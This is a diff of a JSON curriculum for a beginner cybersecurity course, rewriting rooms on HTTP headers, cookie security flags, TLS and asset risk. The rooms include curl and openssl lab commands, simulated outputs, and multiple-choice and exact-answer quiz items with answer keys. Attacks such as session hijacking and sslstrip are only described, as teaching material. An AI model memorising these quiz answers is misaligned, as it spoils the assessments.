+        "instruction": "Execute `curl -I http://10.10.10.45/login` in the terminal.",
         "hints": [
-          "Concept: Verbose HTTP inspection.",
-          "Direction: Use the `-v` flag with curl.",
-          "Tool: `curl`",
-          "Syntax: `curl -v http://localhost:8080/api/status`",
-          "Explanation: Displays full headers and payload."
+          "Type: `curl -I http://10.10.10.45/login`"
         ]
       }
     ],
-    "explainResult": "The `curl` command opened a TCP connection to localhost:8080, transmitted formatted HTTP request lines, received the `200 OK` header block, and parsed the JSON body.",
-    "securityConnection": "Every web vulnerability scanner (Burp Suite, OWASP ZAP, ffuf) is fundamentally an HTTP crafting tool! When testing for SQL injection, XSS, or IDOR, you will modify headers, change methods from GET to POST, and inject payloads directly into the request body.",
-    "completion": {
-      "learned": [
-        "The anatomy of an HTTP request (Method, Path, Version, Headers, Body)",
-        "The anatomy of an HTTP response (Status Line, Headers, Payload)",
-        "Standard status codes: 200, 301/302, 400, 401, 403, 404, 500",
-        "Using curl -v to analyze raw HTTP headers"
-      ],
-      "practiced": [
-        "curl -v",
-        "Inspecting request and response headers",
-        "Differentiating client errors from server errors"
-      ]
-    },
-    "nextRoomId": "room-13"
+    "securityConnection": "When testing for Insecure Direct Object References (IDOR), changing an ID from `user/10` to `user/11` should return a `403 Forbidden` if authorization is properly enforced. If the server instead returns `200 OK` with another user's private data, you have found a critical security flaw!",
+    "id": "room-30",
+    "nextRoomId": "room-31"
   },
   {
-    "id": "room-13",
-    "stage": 3,
-    "stageTitle": "Stage 3 — How the Web Works",
-    "title": "Browsers, Cookies & Sessions",
+    "stage": 5,
+    "level": 5,
+    "levelTitle": "Level 5 \u2014 Internet & Web Fundamentals",
+    "title": "HTTP Headers, Cookies & Stateful Sessions",
     "difficulty": "Foundation",
-    "difficultyBadge": "🔵 Foundation",
-    "estimatedTime": "25 min",
-    "prerequisites": "Room 12 (HTTP Fundamentals)",
-    "whyAreYouHere": "HTTP has a profound quirk: it is completely **stateless**. This means when you click from page 1 to page 2 on a website, the server has no memory of who you are or that you just logged in three seconds ago! How do modern web apps keep you logged in as you browse? The answer is **Cookies and Sessions**. In this room, you will learn how browsers store state, how session tokens work, and why cookies are prime targets for cyber attackers.",
+    "difficultyBadge": "\ud83d\udd35 Foundation",
+    "estimatedTime": "30 min",
+    "prerequisites": "Room 30: HTTP Requests, Methods & Status Codes",
+    "whyAreYouHere": "HTTP is inherently a 'stateless' protocol: once a web server sends a response, it forgets who you are! To keep you logged in as you click from page to page, websites use HTTP Headers and Cookies to track sessions. In this room, you will learn how headers transmit metadata, how session tokens work, and how security flags (`HttpOnly`, `Secure`, `SameSite`) protect cookies from theft.",
     "objectives": [
-      "Understand why HTTP is stateless and how state is maintained",
-      "Learn how the server issues cookies using the `Set-Cookie` header",
-      "Understand Session Identifiers (Session IDs) and server-side session stores",
-      "Master critical cookie security flags: `HttpOnly`, `Secure`, and `SameSite`",
-      "Understand session hijacking and how attackers steal login tokens"
+      "Understand the structure of HTTP Request and Response Headers (Key-Value pairs)",
+      "Identify common request headers: `User-Agent`, `Host`, `Accept`, and `Authorization`",
+      "Learn how websites maintain persistent logins using Session IDs stored in Cookies",
+      "Deconstruct the `Set-Cookie` header and its security flags: `HttpOnly`, `Secure`, and `SameSite`",
+      "Understand essential security headers: HSTS, Content-Security-Policy (CSP), and X-Frame-Options"
     ],
     "vocabulary": [
       {
-        "term": "Stateless Protocol",
-        "definition": "A communication protocol in which the receiver retains no memory or session state between independent requests."
+        "term": "HTTP Header",
+        "definition": "A field in an HTTP request or response that passes additional operating parameters, security policies, and authentication tokens."
       },
       {
-        "term": "HTTP Cookie",
-        "definition": "A small piece of data stored by the user's web browser, automatically sent back to the server with subsequent requests."
+        "term": "Cookie",
+        "definition": "A small piece of data stored in the user's web browser by the server to identify user sessions and track preferences."
       },
       {
-        "term": "Session ID",
-        "definition": "A random, high-entropy unique string generated by the server upon successful authentication to track a user's session."
+        "term": "Set-Cookie",
+        "definition": "The HTTP response header sent by a server instructing the client browser to store a cookie."
       },
       {
         "term": "HttpOnly Flag",
-        "definition": "A cookie attribute that blocks JavaScript (`document.cookie`) from accessing the cookie, protecting it from theft via XSS."
+        "definition": "A cookie security flag that blocks client-side JavaScript (document.cookie) from accessing the cookie, preventing XSS cookie theft."
       },
       {
         "term": "Secure Flag",
-        "definition": "A cookie attribute ensuring the cookie is only transmitted over encrypted HTTPS connections, never over unencrypted HTTP."
+        "definition": "A cookie security flag ensuring the cookie is only transmitted over encrypted HTTPS connections, never plain HTTP."
       },
       {
-        "term": "SameSite Flag",
-        "definition": "A cookie attribute (`Strict`, `Lax`, or `None`) that controls whether cookies are sent with cross-site requests, mitigating CSRF."
+        "term": "HSTS (Strict-Transport-Security)",
+        "definition": "A response header forcing browsers to communicate strictly over encrypted HTTPS, preventing SSL stripping."
       }
     ],
+    "diagramSvg": "<svg viewBox=\"0 0 600 160\" width=\"100%\" height=\"160\" xmlns=\"http://www.w3.org/2000/svg\" style=\"background:#0f172a;border-radius:8px;font-family:monospace;\">\n  <rect x=\"30\" y=\"30\" width=\"150\" height=\"100\" rx=\"8\" fill=\"#1e293b\" stroke=\"#38bdf8\" stroke-width=\"2\"/>\n  <text x=\"105\" y=\"70\" fill=\"#f8fafc\" font-size=\"13\" font-weight=\"bold\" text-anchor=\"middle\">Web Browser</text>\n  <text x=\"105\" y=\"95\" fill=\"#38bdf8\" font-size=\"11\" text-anchor=\"middle\">(Client)</text>\n\n  <!-- Request -->\n  <line x1=\"180\" y1=\"60\" x2=\"420\" y2=\"60\" stroke=\"#38bdf8\" stroke-width=\"2\"/>\n  <polygon points=\"420,60 410,55 410,65\" fill=\"#38bdf8\"/>\n  <text x=\"300\" y=\"52\" fill=\"#38bdf8\" font-size=\"11\" text-anchor=\"middle\">GET /login.html HTTP/1.1</text>\n\n  <!-- Response -->\n  <line x1=\"420\" y1=\"100\" x2=\"180\" y2=\"100\" stroke=\"#10b981\" stroke-width=\"2\"/>\n  <polygon points=\"180,100 190,95 190,105\" fill=\"#10b981\"/>\n  <text x=\"300\" y=\"118\" fill=\"#10b981\" font-size=\"11\" text-anchor=\"middle\">HTTP/1.1 200 OK (HTML Payload)</text>\n\n  <rect x=\"420\" y=\"30\" width=\"150\" height=\"100\" rx=\"8\" fill=\"#1e293b\" stroke=\"#10b981\" stroke-width=\"2\"/>\n  <text x=\"495\" y=\"70\" fill=\"#f8fafc\" font-size=\"13\" font-weight=\"bold\" text-anchor=\"middle\">Nginx Server</text>\n  <text x=\"495\" y=\"95\" fill=\"#10b981\" font-size=\"11\" text-anchor=\"middle\">Port 80 / 443</text>\n</svg>",
     "lessons": [
       {
-        "title": "1. The Coat Check Analogy",
-        "content": "When you check your coat at a theater:\n1. You give the attendant your coat.\n2. They hand you a small ticket with a random number: **#4092**.\n3. When you return, you don't re-explain who you are; you simply show ticket **#4092**, and they hand back your coat.\n\nThat ticket is a **Session Cookie**! When you log in with your username and password, the server verifies them, generates a random session ticket (`SESSIONID=a8f9c2d1...`), and sends it back in a `Set-Cookie` header. For every future click, your browser automatically attaches that cookie."
+        "title": "1. The Anatomy of HTTP Headers",
+        "content": "Headers are plain-text `Key: Value` lines sent before the HTML body:\n\n**Request Headers (Sent by Browser)**:\n\u2022 `Host: endlessus.in`: Tells the server which website you want (essential when one server hosts 50 websites!).\n\u2022 `User-Agent: Mozilla/5.0...`: Identifies the browser, version, and operating system.\n\u2022 `Cookie: session_id=abc123xyz`: Transmits your secret login token with every click!\n\n**Response Headers (Sent by Server)**:\n\u2022 `Server: nginx/1.24.0`: Identifies server software (often hidden to prevent version profiling).\n\u2022 `Set-Cookie: session_id=abc123xyz; Path=/; Secure; HttpOnly`: Creates a session cookie."
       },
       {
-        "title": "2. The Essential Cookie Security Flags",
-        "content": "Because session cookies grant complete account access, browsers provide three crucial defense flags:\n• `HttpOnly`: Tells the browser: *\"Never let JavaScript scripts read this cookie.\"* If a hacker finds an XSS bug, they still cannot steal an HttpOnly cookie!\n• `Secure`: Tells the browser: *\"Never transmit this cookie over unencrypted HTTP.\"* Prevents coffee-shop Wi-Fi eavesdroppers from sniffing the session token.\n• `SameSite=Lax/Strict`: Tells the browser: *\"Do not send this cookie when requests originate from external third-party websites.\"* Prevents CSRF attacks."
+        "title": "2. The Golden Triad of Cookie Security",
+        "content": "When a bank server assigns a session cookie, it MUST include three security flags:\n\n1. **`HttpOnly`**: Blocks JavaScript (`document.cookie`). If a hacker exploits a Cross-Site Scripting (XSS) vulnerability, they CANNOT steal the session cookie!\n2. **`Secure`**: Forces the browser to transmit the cookie ONLY over encrypted HTTPS. Prevents Wi-Fi eavesdroppers from intercepting your token.\n3. **`SameSite=Strict` or `Lax`**: Controls whether cookies are sent on cross-site requests. The primary defense against Cross-Site Request Forgery (CSRF)!"
+      },
+      {
+        "title": "3. Vital HTTP Security Headers",
+        "content": "Modern servers harden themselves by sending these response headers:\n\n\u2022 **`Strict-Transport-Security (HSTS)`**: Forces HTTPS connection encryption for a year.\n\u2022 **`X-Frame-Options: DENY`**: Prevents the website from being embedded inside an `<iframe>` on an attacker's site (stops Clickjacking!).\n\u2022 **`Content-Security-Policy (CSP)`**: Restricts which domains scripts, images, and styles can be loaded from (stops XSS execution)."
       }
     ],
     "seeExamples": [
       {
-        "title": "Setting and Sending a Session Cookie",
-        "codeOrDiagram": "[ Step 1: User logs in ]\nPOST /api/login HTTP/1.1\nHost: endlessus.in\nusername=cadet&password=ValidPassword123\n\n[ Step 2: Server responds with Set-Cookie ]\nHTTP/1.1 200 OK\nSet-Cookie: session_id=x99aK10zP9q; Path=/; Secure; HttpOnly; SameSite=Lax\n\n[ Step 3: Browser automatically attaches Cookie on next request ]\nGET /profile HTTP/1.1\nHost: endlessus.in\nCookie: session_id=x99aK10zP9q",
-        "explanation": "Notice the three flags: `Secure`, `HttpOnly`, and `SameSite=Lax`. This is an enterprise-hardened session cookie."
+        "title": "Auditing Cookie Flags with curl",
+        "codeOrDiagram": "cadet@endlessus:~$ curl -I http://10.10.10.45/login | grep -i \"set-cookie\"\nSet-Cookie: session=eyJhbGciOi...; Path=/; HttpOnly; SameSite=Strict\n\n[+] Security Audit: Cookie contains HttpOnly and SameSite=Strict flags!",
+        "explanation": "`curl -I` piped into `grep -i set-cookie` extracts cookie definitions to verify security flags."
       }
     ],
     "tryInteractive": {
       "type": "terminal",
-      "prompt": "Simulate a login request that returns a session cookie, storing it into a local cookie jar using `curl -c cookies.txt -d \"user=cadet&pass=letmein\" http://localhost:8080/login`:",
+      "prompt": "Run `curl -I https://staging.acmefin.local | grep -i strict` to audit HSTS header enforcement:",
       "initialCommand": "",
-      "expectedCommand": "curl -c cookies.txt -d \"user=cadet&pass=letmein\" http://localhost:8080/login",
-      "simulatedOutput": "HTTP/1.1 200 OK\nSet-Cookie: auth_token=e4d9b26a8f110c7e; Path=/; HttpOnly; Secure\n{\"message\":\"Login successful. Session established.\"}\n[+] Success! Cookie stored in cookies.txt: auth_token=e4d9b26a8f110c7e.",
-      "explanation": "`curl -c <file>` instructs curl to act like a web browser's cookie storage engine, capturing any `Set-Cookie` headers for future requests."
+      "expectedCommand": "curl -I https://staging.acmefin.local | grep -i strict",
+      "simulatedOutput": "[!] Audit result: No Strict-Transport-Security header returned (HSTS missing!).",
+      "explanation": "Absence of HSTS header indicates an HTTP downgrade vulnerability."
     },
     "questions": [
       {
-        "id": "r13-q1",
-        "type": "multiple-choice",
-        "question": "Which cookie security attribute prevents client-side JavaScript (such as `document.cookie`) from reading or extracting the session token?",
-        "options": [
-          "SameSite",
-          "HttpOnly",
-          "Max-Age",
-          "Domain"
+        "id": "q-31-1",
+        "type": "exact",
+        "question": "Which cookie security flag prevents client-side JavaScript code (document.cookie) from accessing or stealing the cookie?",
+        "visualSlots": "_ _ _ _ _ _ _ _",
+        "acceptedAnswers": [
+          "HttpOnly"
         ],
-        "correctIndex": 1,
-        "explanation": "The `HttpOnly` flag restricts cookie access strictly to HTTP headers, blocking JavaScript access and preventing session theft via XSS."
+        "caseSensitive": false,
+        "trimWhitespace": true,
+        "hint": "Http + Only.",
+        "explanation": "HttpOnly blocks script access to cookies, mitigating XSS cookie theft."
       },
       {
-        "id": "r13-q2",
+        "id": "q-31-2",
         "type": "multiple-choice",
-        "question": "If an attacker manages to obtain a legitimate user's active session cookie, what can they do?",
+        "question": "Which HTTP security response header prevents a web page from being rendered inside an iframe, protecting against Clickjacking attacks?",
         "options": [
-          "Nothing, because cookies can only be used on the physical computer that created them",
-          "They can impersonate the victim and perform actions as that user without ever knowing their password (Session Hijacking)",
-          "They can only view the server's public IP address",
-          "They must crack the password hash before using the cookie"
+          "Server",
+          "X-Frame-Options",
+          "User-Agent",
+          "Content-Type"
         ],
         "correctIndex": 1,
-        "explanation": "Since the server trusts the session cookie as proof of authentication, possessing the cookie allows complete account takeover (Session Hijacking)."
+        "hint": "Frame options header.",
+        "explanation": "X-Frame-Options (DENY / SAMEORIGIN) blocks iframe framing to prevent Clickjacking."
       }
     ],
     "tasks": [
       {
-        "title": "Task 1: Capture and Save Session Cookie",
-        "instruction": "Use curl with `-c cookies.txt` to capture the authenticated session cookie from the lab login endpoint.",
+        "title": "Task 1: Audit HTTP headers with curl",
+        "instruction": "Execute `curl -I https://staging.acmefin.local | grep -i strict` in the terminal.",
         "hints": [
-          "Concept: Store incoming cookies in a cookie jar file.",
-          "Direction: Use the `-c` flag with curl.",
-          "Tool: `curl`",
-          "Syntax: `curl -c cookies.txt -d \"user=cadet&pass=letmein\" http://localhost:8080/login`",
-          "Explanation: Saves cookie for session reuse."
+          "Type: `curl -I https://staging.acmefin.local | grep -i strict`"
         ]
       }
     ],
-    "explainResult": "The server validated the credentials, generated a 64-bit session token, and passed it in the `Set-Cookie` header. Curl captured this into `cookies.txt`.",
-    "securityConnection": "Cookie theft is one of the most lucrative objectives for cyber adversaries. Malware like 'Infostealers' specifically scan Chrome and Firefox profile folders on infected computers to extract stored session cookies, allowing hackers to bypass Multi-Factor Authentication (MFA) on corporate accounts!",
-    "completion": {
-      "learned": [
-        "Why HTTP is stateless and how cookies preserve session state",
-        "How servers generate and issue Session IDs via Set-Cookie",
-        "The critical defense flags: HttpOnly, Secure, and SameSite",
-        "The mechanism and danger of Session Hijacking"
-      ],
-      "practiced": [
-        "curl -c cookies.txt",
-        "Inspecting cookie jar structures",
-        "Evaluating cookie security flags"
-      ]
-    },
-    "nextRoomId": "room-14"
+    "securityConnection": "In **Lab 01 (lab-headers)**, you audit a staging financial portal using `curl -I | grep -i strict` and `curl -I | grep -i frame` to identify missing HSTS and X-Frame-Options headers, then harden the Nginx configuration to achieve full security compliance.",
+    "id": "room-31",
+    "nextRoomId": "room-32"
   },
   {
-    "id": "room-14",
-    "stage": 4,
-    "stageTitle": "Stage 4 — Cybersecurity Fundamentals",
-    "title": "What Are We Protecting? Assets, Threats & Risk",
-    "difficulty": "Beginner",
-    "difficultyBadge": "🟢 Beginner",
-    "estimatedTime": "20 min",
-    "prerequisites": "Stage 3 (How the Web Works)",
-    "whyAreYouHere": "You now understand computers, operating systems, networks, and the web. But what are we actually trying to defend? Cybersecurity is not about installing antivirus and hoping for the best; it is a rigorous discipline of risk management. In this room, you will learn the fundamental equation that governs all enterprise security: how Assets, Threats, Vulnerabilities, and Controls determine business Risk.",
-    "objectives": [
-      "Define the four core pillars: Assets, Threats, Vulnerabilities, and Risk",
-      "Master the fundamental Risk Equation: Risk = Threat × Vulnerability × Asset Impact",
-      "Understand what constitutes an organization's Attack Surface",
-      "Differentiate between Preventative, Detective, and Corrective security controls",
-      "Calculate risk scores in a simulated enterprise scenario"
-    ],
-    "vocabulary": [
-      {
-        "term": "Asset",
-        "definition": "Anything of value to an organization that must be protected, including customer data, intellectual property, financial records, and hardware servers."
-      },
-      {
-        "term": "Threat",
-        "definition": "Any potential circumstance or event that could exploit a vulnerability to cause harm (e.g. ransomware gangs, rogue insiders, power outages)."
-      },
-      {
-        "term": "Vulnerability",
-        "definition": "A flaw or weakness in system design, implementation, or operation that could be leveraged by a threat."
-      },
-      {
-        "term": "Risk",
-        "definition": "The potential for loss, damage, or destruction of an asset resulting from a threat exploiting a vulnerability."
-      },
-      {
-        "term": "Attack Surface",
-        "definition": "The total sum of all possible points (endpoints, ports, web forms, employees) where an unauthorized user can try to enter or extract data."
-      },
-      {
-        "term": "Security Control",
-        "definition": "A safeguard or countermeasure prescribed to reduce risk and protect confidentiality, integrity, or availability."
-      }
-    ],
-    "lessons": [
-      {
-        "title": "1. The Fundamental Risk Equation",
-        "content": "Many beginners confuse threats with vulnerabilities. Here is how they connect:\n• An unpatched web server with an open SQL injection bug is a **Vulnerability**.\n• A criminal hacking group seeking financial gain is a **Threat**.\n• If that web server contains the credit card records of 500,000 customers, that is the **Asset**.\n• **Risk** is what happens when the Threat finds the Vulnerability to compromise the Asset!"
-      },
-      {
-        "title": "2. The Three Control Categories",
-        "content": "Security teams deploy three layers of defense:\n1. **Preventative Controls**: Block attacks before they happen (e.g. firewalls, strong passwords, input validation).\n2. **Detective Controls**: Identify attacks while or after they happen (e.g. intrusion detection systems, security audit logs, file integrity monitors).\n3. **Corrective Controls**: Minimize damage and restore normal operations after an incident (e.g. daily offline backups, incident response plans)."
-      }
-    ],
-    "seeExamples": [
-      {
-        "title": "Risk Calculation Matrix",
-        "codeOrDiagram": "Likelihood   Impact      Risk Level   Recommended Action\nHigh         Critical    CRITICAL     Fix immediately (Emergency patch)\nHigh         Low         MEDIUM       Schedule in next sprint\nLow          Critical    HIGH         Deploy mitigating controls\nLow          Low         LOW          Accept or monitor",
-        "explanation": "Organizations prioritize vulnerabilities based on likelihood and impact, not just theoretical severity."
-      }
-    ],
-    "tryInteractive": {
-      "type": "terminal",
-      "prompt": "Audit an asset inventory file to identify exposed critical assets using `cat /etc/endlessus/assets.json`:",
-      "initialCommand": "",
-      "expectedCommand": "cat /etc/endlessus/assets.json",
-      "simulatedOutput": "{\n  \"asset_id\": \"DB-PRIMARY-01\",\n  \"asset_type\": \"Production PostgreSQL Database\",\n  \"data_classification\": \"CONFIDENTIAL - PCI/Customer Records\",\n  \"vulnerability\": \"CVE-2024-Unpatched Remote Code Execution\",\n  \"exposure\": \"Publicly accessible on port 5432\",\n  \"calculated_risk\": \"CRITICAL\"\n}\n[+] Success! Critical unpatched asset identified with public exposure.",
-      "explanation": "Auditing asset registries allows security architects to spot misconfigured public database servers immediately."
-    },
-    "questions": [
-      {
-        "id": "r14-q1",
-        "type": "multiple-choice",
-        "question": "A company operates an internal accounting server that has a severe unpatched vulnerability, but the server is completely disconnected from the internet and inside a locked vault. Why is the actual risk considered low?",
-        "options": [
-          "Because accounting data has zero value to attackers",
-          "Because the threat cannot reach the vulnerability, making the likelihood of remote exploitation near zero",
-          "Because unpatched bugs fix themselves over time",
-          "Because Linux kernels are immune to malware"
-        ],
-        "correctIndex": 1,
-        "explanation": "Risk requires both vulnerability and threat likelihood. If an asset is isolated from threats, the risk of exploitation drops dramatically."
-      },
-      {
-        "id": "r14-q2",
-        "type": "multiple-choice",
-        "question": "Which of the following is an example of a Detective security control?",
-        "options": [
-          "A steel security door with a biometric fingerprint scanner",
-          "A web application firewall that blocks SQL injection requests",
-          "A Security Information and Event Management (SIEM) system analyzing login logs for unusual nighttime spikes",
-          "An automated daily offline backup tape"
-        ],
-        "correctIndex": 2,
-        "explanation": "A SIEM analyzes logs to detect ongoing or past intrusions, making it a detective control."
-      }
-    ],
-    "tasks": [
-      {
-        "title": "Task 1: Inspect Asset Risk Profile",
-        "instruction": "Read the asset inventory file using `cat /etc/endlessus/assets.json` to inspect classification levels.",
-        "hints": [
-          "Concept: Inspect asset management database.",
-          "Direction: Use the cat command.",
-          "Tool: `cat`",
-          "Syntax: `cat /etc/endlessus/assets.json`",
-          "Explanation: Displays asset metadata and risk."
-        ]
-      }
-    ],
-    "explainResult": "The `cat` utility read the JSON object defining asset classification, exposure vector, and calculated risk level.",
-    "securityConnection": "Every commercial penetration test begins with scoping assets. Testers do not attack random servers; they focus testing on high-value assets (customer databases, payment gateways) where vulnerabilities create the highest business risk.",
-    "completion": {
-      "learned": [
-        "The core concepts: Asset, Threat, Vulnerability, and Risk",
-        "The risk formula: Risk = Threat × Vulnerability × Asset Value",
-        "The concept of Attack Surface and exposure vectors",
-        "Preventative, Detective, and Corrective security controls"
-      ],
-      "practiced": [
-        "cat /etc/endlessus/assets.json",
-        "Evaluating asset risk rankings",
-        "Differentiating control types"
-      ]
-    },
-    "nextRoomId": "room-15"
-  },
-  {
-    "id": "room-15",
-    "stage": 4,
-    "stageTitle": "Stage 4 — Cybersecurity Fundamentals",
-    "title": "The CIA Triad: Confidentiality, Integrity & Availability",
-    "difficulty": "Beginner",
-    "difficultyBadge": "🟢 Beginner",
+    "stage": 5,
+    "level": 5,
+    "levelTitle": "Level 5 \u2014 Internet & Web Fundamentals",
+    "title": "TLS, HTTPS & Cryptographic Trust Chains",
+    "difficulty": "Foundation",
+    "difficultyBadge": "\ud83d\udd35 Foundation",
     "estimatedTime": "25 min",
-    "prerequisites": "Room 14 (What Are We Protecting?)",
-    "whyAreYouHere": "If you ask a seasoned Chief Information Security Officer (CISO) what their ultimate mission is, they will not say 'stopping hackers'. They will say: 'protecting the CIA Triad'. The CIA Triad is the bedrock mental model of all information security worldwide. In this room, you will explore Confidentiality, Integrity, and Availability, and learn how to categorize any cyber incident in seconds.",
+    "prerequisites": "Room 31: HTTP Headers, Cookies & Stateful Sessions",
+    "whyAreYouHere": "In plain HTTP, every password, session cookie, and credit card number travels across the network in clear unencrypted text. Anyone sitting on public coffee shop Wi-Fi or monitoring an ISP router can read your secrets. HTTPS solves this by wrapping HTTP inside Transport Layer Security (TLS) encryption. In this room, you will learn how symmetric and asymmetric encryption combine to protect data in transit.",
     "objectives": [
-      "Master the three pillars of the CIA Triad: Confidentiality, Integrity, and Availability",
-      "Understand Confidentiality (preventing unauthorized disclosure of data)",
-      "Understand Integrity (preventing unauthorized modification, tampering, or destruction)",
-      "Understand Availability (ensuring systems and data are accessible to authorized users when needed)",
-      "Analyze real-world breach scenarios and map them accurately to C, I, or A impacts"
+      "Understand why unencrypted HTTP is vulnerable to eavesdropping and tampering",
+      "Learn the difference between Symmetric Encryption (fast, shared key) and Asymmetric Encryption (Public/Private key pairs)",
+      "Understand the TLS Handshake: exchanging keys securely over an untrusted channel",
+      "Learn about Digital Certificates (X.509) and Certificate Authorities (CAs)",
+      "Understand browser certificate validation and warnings"
     ],
     "vocabulary": [
       {
-        "term": "CIA Triad",
-        "definition": "The foundational model of information security composed of Confidentiality, Integrity, and Availability."
+        "term": "HTTPS (HTTP Secure)",
+        "definition": "The secure, encrypted version of HTTP operating over TLS on port 443."
       },
+      {
+        "term": "TLS (Transport Layer Security)",
+        "definition": "A cryptographic protocol designed to provide end-to-end communications security, privacy, and data integrity over a computer network (successor to SSL)."
+      },
+      {
+        "term": "Symmetric Encryption",
+        "definition": "Cryptographic method using the same single secret key to both encrypt and decrypt data (e.g. AES-256). Very fast."
+      },
+      {
+        "term": "Asymmetric Encryption",
+        "definition": "Cryptographic method using a mathematically linked Public Key (encrypts) and Private Key (decrypts) pair (e.g. RSA, ECC)."
+      },
+      {
+        "term": "CA (Certificate Authority)",
+        "definition": "A trusted third-party organization (like Let's Encrypt, DigiCert) that cryptographically signs digital certificates verifying domain ownership."
+      }
+    ],
+    "diagramSvg": "<svg viewBox=\"0 0 600 200\" width=\"100%\" height=\"200\" xmlns=\"http://www.w3.org/2000/svg\" style=\"background:#0f172a;border-radius:8px;font-family:monospace;\">\n  <line x1=\"120\" y1=\"30\" x2=\"120\" y2=\"180\" stroke=\"#38bdf8\" stroke-width=\"3\"/>\n  <text x=\"120\" y=\"22\" fill=\"#38bdf8\" font-size=\"13\" font-weight=\"bold\" text-anchor=\"middle\">Client (You)</text>\n  \n  <line x1=\"480\" y1=\"30\" x2=\"480\" y2=\"180\" stroke=\"#10b981\" stroke-width=\"3\"/>\n  <text x=\"480\" y=\"22\" fill=\"#10b981\" font-size=\"13\" font-weight=\"bold\" text-anchor=\"middle\">Target Server</text>\n\n  <!-- Step 1 SYN -->\n  <line x1=\"120\" y1=\"60\" x2=\"480\" y2=\"80\" stroke=\"#f59e0b\" stroke-width=\"2\"/>\n  <polygon points=\"480,80 470,75 470,85\" fill=\"#f59e0b\"/>\n  <text x=\"300\" y=\"65\" fill=\"#f59e0b\" font-size=\"11\" font-weight=\"bold\" text-anchor=\"middle\">1. SYN (Synchronize seq=100)</text>\n\n  <!-- Step 2 SYN-ACK -->\n  <line x1=\"480\" y1=\"105\" x2=\"120\" y2=\"125\" stroke=\"#38bdf8\" stroke-width=\"2\"/>\n  <polygon points=\"120,125 130,120 130,130\" fill=\"#38bdf8\"/>\n  <text x=\"300\" y=\"110\" fill=\"#38bdf8\" font-size=\"11\" font-weight=\"bold\" text-anchor=\"middle\">2. SYN-ACK (ack=101 seq=300)</text>\n\n  <!-- Step 3 ACK -->\n  <line x1=\"120\" y1=\"150\" x2=\"480\" y2=\"170\" stroke=\"#10b981\" stroke-width=\"2\"/>\n  <polygon points=\"480,170 470,165 470,175\" fill=\"#10b981\"/>\n  <text x=\"300\" y=\"155\" fill=\"#10b981\" font-size=\"11\" font-weight=\"bold\" text-anchor=\"middle\">3. ACK (Connection Established)</text>\n</svg>",
+    "lessons": [
+      {
+        "title": "1. Symmetric vs Asymmetric Cryptography",
+        "content": "HTTPS uses the best of both worlds:\n\n\u2022 **Asymmetric Cryptography (Public/Private Keys)**: Anyone can take your **Public Key** and lock a message in a digital safe. But ONLY your secret **Private Key** can unlock it! It solves the key-exchange problem, but is computationally slow.\n\u2022 **Symmetric Cryptography (AES-GCM)**: Fast and efficient, but both parties must share the exact same secret key.\n\n**The Solution**: HTTPS uses Asymmetric encryption for the first 10 milliseconds of the connection just to safely agree on a random temporary 'Session Key'. Once agreed, both sides switch to fast Symmetric encryption for all web browsing!"
+      },
+      {
+        "title": "2. Digital Certificates & Certificate Authorities",
+        "content": "When your browser connects to `bank.com`, how does it know it is talking to the real bank and not an imposter?\n\nThe server presents an **X.509 Digital Certificate** containing its public key. Crucially, this certificate is digitally signed by a trusted **Certificate Authority (CA)** (like Let's Encrypt or DigiCert).\n\nYour operating system has a built-in 'Root CA Store' of trusted authorities. If a certificate is self-signed or expired, your browser flashes a massive red security warning!"
+      }
+    ],
+    "seeExamples": [
+      {
+        "title": "Inspecting TLS Certificates with openssl",
+        "codeOrDiagram": "cadet@endlessus:~$ openssl s_client -connect endlessus.in:443 -servername endlessus.in < /dev/null 2>/dev/null | openssl x509 -noout -dates -issuer\nnotBefore=Oct  1 00:00:00 2026 GMT\nnotAfter=Dec 30 23:59:59 2026 GMT\nissuer=C = US, O = Let's Encrypt, CN = R3",
+        "explanation": "`openssl` verifies that the TLS certificate is authentic, unexpired, and signed by Let's Encrypt."
+      }
+    ],
+    "tryInteractive": {
+      "type": "terminal",
+      "prompt": "Run `curl -Iv https://endlessus.in 2>&1 | grep -i \"alpn\\|tls\"` to inspect TLS handshake protocol negotiation:",
+      "initialCommand": "",
+      "expectedCommand": "curl -Iv https://endlessus.in 2>&1 | grep -i \"alpn\\|tls\"",
+      "simulatedOutput": "* ALPN: server accepted h2\n* TLSv1.3 (IN), TLS handshake, Finished (20)\n[+] TLS handshake verified: TLS 1.3 negotiated successfully.",
+      "explanation": "`curl -v` prints verbose TLS handshake diagnostics."
+    },
+    "questions": [
+      {
+        "id": "q-32-1",
+        "type": "exact",
+        "question": "Which modern cryptographic protocol replaced SSL to provide encryption and integrity for HTTPS traffic on port 443?",
+        "visualSlots": "_ _ _",
+        "acceptedAnswers": [
+          "TLS",
+          "Transport Layer Security"
+        ],
+        "caseSensitive": false,
+        "trimWhitespace": true,
+        "hint": "Transport Layer Security abbreviation.",
+        "explanation": "TLS replaced the deprecated SSL protocol."
+      },
+      {
+        "id": "q-32-2",
+        "type": "multiple-choice",
+        "question": "What type of cryptography uses mathematically linked Public and Private key pairs to securely exchange information?",
+        "options": [
+          "Symmetric Encryption",
+          "Asymmetric Encryption (Public Key Cryptography)",
+          "Base64 Encoding",
+          "One-Way Hashing"
+        ],
+        "correctIndex": 1,
+        "hint": "Asymmetric uses two different keys.",
+        "explanation": "Asymmetric encryption uses public/private key pairs for secure key exchange."
+      }
+    ],
+    "tasks": [
+      {
+        "title": "Task 1: Inspect TLS handshake negotiation",
+        "instruction": "Execute `curl -Iv https://endlessus.in 2>&1 | grep -i \"alpn\\|tls\"` in the terminal.",
+        "hints": [
+          "Type: `curl -Iv https://endlessus.in 2>&1 | grep -i \"alpn\\|tls\"`"
+        ]
+      }
+    ],
+    "securityConnection": "Attackers on public Wi-Fi networks historically used tools like `sslstrip` to downgrade client connections from encrypted HTTPS to unencrypted HTTP, allowing them to read login credentials in cleartext. Websites enforce HSTS headers to permanently block downgrade attacks.",
+    "id": "room-32",
+    "nextRoomId": "room-33"
+  },
+  {
+    "stage": 5,
+    "level": 5,
+    "levelTitle": "Level 5 \u2014 Internet & Web Fundamentals",
+    "title": "Web Architecture: HTML, Client vs Server & APIs",
+    "difficulty": "Foundation",
+    "difficultyBadge": "\ud83d\udd35 Foundation",
+    "estimatedTime": "25 min",
+    "prerequisites": "Room 32: TLS, HTTPS & Cryptographic Trust",
+    "whyAreYouHere": "A modern web application is not just a static text file; it is a distributed software system. Code runs in two completely separate environments: the **Client** (the browser executing HTML, CSS, and JavaScript) and the **Server** (Node.js, Python, or PHP executing backend queries against a database). In this room, you will learn the client-server boundary, REST APIs, and why client-side security checks can always be bypassed by attackers.",
+    "objectives": [
+      "Understand the core frontend building blocks: HTML (structure), CSS (styling), and JavaScript (interactivity)",
